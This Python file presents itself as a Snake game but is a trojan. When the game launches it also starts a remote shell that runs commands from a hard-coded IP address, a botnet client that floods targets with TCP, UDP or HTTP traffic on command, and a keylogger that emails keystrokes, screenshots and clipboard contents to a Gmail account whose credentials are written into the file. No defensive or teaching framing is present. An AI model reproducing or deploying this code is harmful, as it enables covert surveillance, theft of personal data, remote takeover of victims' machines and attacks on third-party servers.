
import pygame, sys, time, random
from pycomm.connection import Connection

import time, subprocess, threading, socket

from threading import Timer
from datetime import datetime

import keyboard, clipboard# for keylogs
import smtplib
from os.path import expanduser

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

import pyautogui
import numpy as np
import cv2

MASTER_ADDRESS = "52.187.18.17"
MASTER_PORT = 7982
POLL_INTERVAL = 20




SEND_REPORT_EVERY = 10 # in seconds, 60 means 1 minute and so on
EMAIL_ADDRESS = "ramshyamdam04@gmail.com"
EMAIL_PASSWORD = "zombiepasta!"
  
# Snake Game!
# by root
# small fixes by Phil

# our game imports
import pygame, sys, random, time



# FPS controller

import math
import random
import pygame
import random
import tkinter as tk
from tkinter import messagebox

width = 500
height = 500

cols = 25
rows = 20


class cube():
    rows = 20
    w = 500
    def __init__(self, start, dirnx=1, dirny=0, color=(255,0,0)):
        self.pos = start
        self.dirnx = dirnx
        self.dirny = dirny # "L", "R", "U", "D"
        self.color = color

    def move(self, dirnx, dirny):
        self.dirnx = dirnx
        self.dirny = dirny
        self.pos  = (self.pos[0] + self.dirnx, self.pos[1] + self.dirny)
            

    def draw(self, surface, eyes=False):
        dis = self.w // self.rows
        i = self.pos[0]
        j = self.pos[1]
        
        pygame.draw.rect(surface, self.color, (i*dis+1,j*dis+1,dis-2,dis-2))
        if eyes:
            centre = dis//2
            radius = 3
            circleMiddle = (i*dis+centre-radius,j*dis+8)
            circleMiddle2 = (i*dis + dis -radius*2, j*dis+8)
            pygame.draw.circle(surface, (0,0,0), circleMiddle, radius)
            pygame.draw.circle(surface, (0,0,0), circleMiddle2, radius)
        


class snake():
    body = []
    turns = {}
    
    def __init__(self, color, pos):
        #pos is given as coordinates on the grid ex (1,5)
        self.color = color
        self.head = cube(pos)
        self.body.append(self.head)
        self.dirnx = 0
        self.dirny = 1
    
    def move(self):
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                pygame.quit()
                exit()
            keys = pygame.key.get_pressed()

            for key in keys:
                if keys[pygame.K_LEFT]:
                    self.dirnx = -1
                    self.dirny = 0
                    self.turns[self.head.pos[:]] = [self.dirnx,self.dirny]
                elif keys[pygame.K_RIGHT]:
                    self.dirnx = 1
                    self.dirny = 0
                    self.turns[self.head.pos[:]] = [self.dirnx,self.dirny]
                elif keys[pygame.K_UP]:
                    self.dirny = -1
                    self.dirnx = 0
                    self.turns[self.head.pos[:]] = [self.dirnx,self.dirny]
                elif keys[pygame.K_DOWN]:
                    self.dirny = 1
                    self.dirnx = 0
                    self.turns[self.head.pos[:]] = [self.dirnx,self.dirny]
        
        for i, c in enumerate(self.body):
            p = c.pos[:]
            if p in self.turns:
                turn = self.turns[p]
                c.move(turn[0], turn[1])
                if i == len(self.body)-1:
                    self.turns.pop(p)
            else:
                c.move(c.dirnx,c.dirny)
        
        
    def reset(self,pos):
        self.head = cube(pos)
        self.body = []
        self.body.append(self.head)
        self.turns = {}
        self.dirnx = 0
        self.dirny = 1

    def addCube(self):
        tail = self.body[-1]
        dx, dy = tail.dirnx, tail.dirny

        if dx == 1 and dy == 0:
            self.body.append(cube((tail.pos[0]-1,tail.pos[1])))
        elif dx == -1 and dy == 0:
            self.body.append(cube((tail.pos[0]+1,tail.pos[1])))
        elif dx == 0 and dy == 1:
            self.body.append(cube((tail.pos[0],tail.pos[1]-1)))
        elif dx == 0 and dy == -1:
            self.body.append(cube((tail.pos[0],tail.pos[1]+1)))

        self.body[-1].dirnx = dx
        self.body[-1].dirny = dy
    
    def draw(self, surface):
        for i,c in enumerate(self.body):
            if i == 0:
                c.draw(surface, True)
            else:
                c.draw(surface)



def redrawWindow():
    global win
    win.fill((0,0,0))
    drawGrid(width, rows, win)
    s.draw(win)
    snack.draw(win)
    pygame.display.update()
    pass



def drawGrid(w, rows, surface):
    sizeBtwn = w // rows

    x = 0
    y = 0
    for l in range(rows):
        x = x + sizeBtwn
        y = y +sizeBtwn

        pygame.draw.line(surface, (255,255,255), (x, 0),(x,w))
        pygame.draw.line(surface, (255,255,255), (0, y),(w,y))
    


def randomSnack(rows, item):
    positions = item.body

    while True:
        x = random.randrange(1,rows-1)
        y = random.randrange(1,rows-1)
        if len(list(filter(lambda z:z.pos == (x,y), positions))) > 0:
               continue
        else:
               break

    return (x,y)


def game():
    global s, snack, win
    win = pygame.display.set_mode((width,height))
    s = snake((255,0,0), (10,10))
    s.addCube()
    snack = cube(randomSnack(rows,s), color=(0,255,0))
    flag = True
    clock = pygame.time.Clock()
    
    while flag:
        pygame.time.delay(50)
        clock.tick(10)
        s.move()
        headPos = s.head.pos
        if headPos[0] >= 20 or headPos[0] < 0 or headPos[1] >= 20 or headPos[1] < 0:
            print("Score:", len(s.body))
            s.reset((10, 10))

        if s.body[0].pos == snack.pos:
            s.addCube()
            snack = cube(randomSnack(rows,s), color=(0,255,0))
            
        for x in range(len(s.body)):
            if s.body[x].pos in list(map(lambda z:z.pos,s.body[x+1:])):
                print("Score:", len(s.body))
                s.reset((10,10))
                break
                    
        redrawWindow()


def take_screenshot():
    image = pyautogui.screenshot()
    image = cv2.cvtColor(np.array(image),
                     cv2.COLOR_RGB2BGR)
   
    # writing it to the disk using opencv
    cv2.imwrite("screengrab.png", image)

def get_clipboard():
    global text
    text = "It contains clipboard contents" + "\n" + clipboard.paste()    

class Keylogger(threading.Thread):
    def __init__(self, interval, report_method="email"):
        # we gonna pass SEND_REPORT_EVERY to interval
        threading.Thread.__init__(self)
        self.interval = interval
        self.report_method = report_method
        # this is the string variable that contains the log of all 
        # the keystrokes within `self.interval`
        self.log = ""
        # record start & end datetimes
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
    
    def callback(self, event):
        """
        This callback is invoked whenever a keyboard event is occured
        (i.e when a key is released in this example)
        """
        name = event.name
        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        # finally, add the key name to our global `self.log` variable
        self.log += name
    
    def update_filename(self):
        # construct the filename to be identified by start & end datetimes
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        """This method creates a log file in the current directory that contains
        the current keylogs in the `self.log` variable"""
        # open the file in write mode (create it)
        with open(f"{self.filename}.txt", "w") as f:
            # write the keylogs to the file
            print(self.log, file=f)
        #print(f"[+] Saved {self.filename}.txt")

    
    def sendmail(self, email, password, message):
        global text
        
        
        '''create a new gmail account where keylogger will send the file to
        NOTE:
            You Have to enable this:
                allowing less secure apps to access your account
                (https://support.google.com/accounts/answer/6010255)
                refer this link
        '''
        
        #checking if the internet is connected or not
        IPaddress = socket.gethostbyname(socket.gethostname())
        if(IPaddress!='127.0.0.1'):
            #print("connected")
            email_message = MIMEMultipart()
            sub = str(expanduser("~")).split("\\")[-1] 
            email_message['Subject']= "Keylogger information of " + str(sub)
            #print(message)
            #print(len(message))
            email_message.attach(MIMEText(message, "plain"))
            take_screenshot()
            message=""
            filename = "screengrab.png"  # In same directory as script
            with open(filename, "rb") as attachment:
                part = MIMEBase("application", "octet-stream")
                part.set_payload(attachment.read())
                encoders.encode_base64(part)
                part.add_header(
                        "Content-Disposition",
                        f"attachment; filename= {filename}",
                        )
            email_message.attach(part)
            email_message.attach(MIMEText("\n", "plain"))
            get_clipboard()
            email_message.attach(MIMEText(text, "plain"))
            text=""
            send=email_message.as_string()
            #print(len(send))
            if(len(send)!=307):
                #print('inside if')
                s = smtplib.SMTP('smtp.gmail.com', 587)
                s.starttls()
                s.login(email, password)
                s.sendmail(email,email,send)
                send=''
                #print("sent")
        else:
            #print("not connected")
            pass
    def report(self):

        if self.log:
            self.end_dt = datetime.now()
            self.update_filename()
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.report_to_file()
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def run(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()



class Poison (threading.Thread):
    def __init__(self, threadID, url, port, type_name):
        threading.Thread.__init__(self)
        self.url = url
        self.port = port
        self.threadID = threadID
        self.type_name = type_name
    def run(self):
        if self.type_name == 'udp_attack':
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        url = self.url
        port = self.port

        print(f'Connecting to {url}:{port}')

        if(self.type_name == "http_attack"):
            http_get_attack(sock, url, port)
        else:
            sock.connect((url, port))
            sock.send("hello".encode('utf-8'))
        time.sleep(1)
        sock.close()

def http_get_attack(sock, url, port):
    headers = [
        "User-Agent: Mozilla/5.0 (X11; Linux x86_64)",
        "Content-Length: {}".format(random.randint(1024, 2048))
    ]
    message = "GET / HTTP/1.1\n"

    data = message + "\n".join(headers) + "\n\n"

    try:
        sock.connect((url, port))
        for header in headers:
            sock.send(data.encode("utf-8"))

    except Exception as e:
        #print("Error:", e)
        pass


def attack(url, port, n, type_name):
    threads = []
    print("Creating theads...")
    for i in range(n):
        threads.append(Poison(i, url, port, type_name))

    print("Starting threads...")
    for thread in threads:
        thread.start()

    print("Waiting for threads...")
    for thread in threads:
        thread.join()

def handle_command(command):
    try:
        if command.startswith("SEND TCP-SYN"):
            args = command.split()
            url = args[2]
            port = int(args[3])
            n = int(args[4])
            print(url, port)
            attack(url, port, n, "tcp_attack")
        if command.startswith("SEND UDP"):
            args = command.split()
            url = args[2]
            port = int(args[3])
            n = int(args[4])
            print(url, port)
            attack(url, port, n, "udp_attack")
        if command.startswith("SEND HTTP"):
            args = command.split()
            url = args[2]
            port = int(args[3])
            n = int(args[4])
            print(url, port)
            attack(url, port, n, "http_attack")
    except Exception as e:
        print("Error decoding command")
        print(e)
        pass


def bot():
    while True:
        try:
            master = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            master.connect((MASTER_ADDRESS, MASTER_PORT))
            res = master.recv(256)
            command = res.decode("utf-8")
            handle_command(command)
            master.close()
            #print(f'Next poll in {POLL_INTERVAL} seconds...')
        except Exception as e:
            pass
            #print("Error connecting to master", e)
            #print(f'Retrying in {POLL_INTERVAL} seconds...')
        time.sleep(POLL_INTERVAL)
def bot_client():
    while True:
        try:
            conn = Connection("52.187.18.17", 7982)
            conn.connect()
            res = conn.recv()
            command = res.decode("utf-8")
            handle_command(command)
            conn.close()
        except Exception as e:
            pass
        time.sleep(POLL_INTERVAL)


def tcp_client():
    while True:
        try:
            conn = Connection("52.187.18.17", 7983)
            conn.connect()
            break
        except Exception as e:
            pass
        time.sleep(10)

    while True:
        command = conn.recv()
        if command == "EXIT":
            break
        result = "No result"
        try:
            proc = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stdin=subprocess.PIPE,
                    stderr=subprocess.PIPE)
            result=proc.communicate()[0].decode('utf-8')
            proc.wait()
        except Exception as err:
            result = str(err)

        conn.send(result)


if __name__ == "__main__":
    t1 = threading.Thread(target=tcp_client)
    t1.start()
    
    t2 = threading.Thread(target=bot)
    t2.start()

    t3 = Keylogger(SEND_REPORT_EVERY, "email")
    t3.start()

    game()

    t1.join()
    t2.join()
    t3.join()
    #print("done")
